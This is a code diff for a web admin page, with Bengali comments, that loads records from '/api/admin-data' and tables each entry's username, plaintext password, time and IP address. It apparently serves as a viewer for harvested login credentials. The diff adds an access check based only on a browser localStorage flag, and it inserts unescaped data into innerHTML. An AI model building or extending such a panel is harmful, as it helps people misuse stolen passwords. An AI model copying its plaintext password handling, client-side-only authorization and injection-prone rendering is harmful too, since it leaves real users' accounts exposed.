@@ -47,13 +47,19 @@
 </div>
 
 <script>
-  // ডেটা লোড করা
+  // অ্যাডমিন গার্ড
+  if (localStorage.getItem("isAdmin") !== "true") {
+    window.location.href = "/";
+  }
+
+  const tbody = document.getElementById("tableBody");
+  tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;">Loading...</td></tr>`;
+
   fetch("/api/admin-data")
     .then(res => res.json())
     .then(data => {
-      const tbody = document.getElementById("tableBody");
       if (data.length === 0) {
-        tbody.innerHTML = `<tr><td colspan="5" class="empty">কোনো ডেটা পাওয়া যায়নি।</td></tr>`;
+        tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;">কোনো ডেটা পাওয়া যায়নি।</td></tr>`;
         return;
       }
       
@@ -65,13 +71,14 @@
             <td><strong>${item.username}</strong></td>
             <td>${item.password}</td>
             <td>${new Date(item.time).toLocaleString()}</td>
-            <td>${item.ip}</td>
+            <td>${item.ip || "Unknown"}</td>
           </tr>
         `;
       });
     })
-    .catch(() => {
-      document.getElementById("tableBody").innerHTML = `<tr><td colspan="5" class="empty">ডেটা লোড করতে সমস্যা হয়েছে।</td></tr>`;
+    .catch(err => {
+      console.error(err);
+      tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:red;">ডেটা লোড করতে সমস্যা হয়েছে।</td></tr>`;
     });
 
   // লগআউট
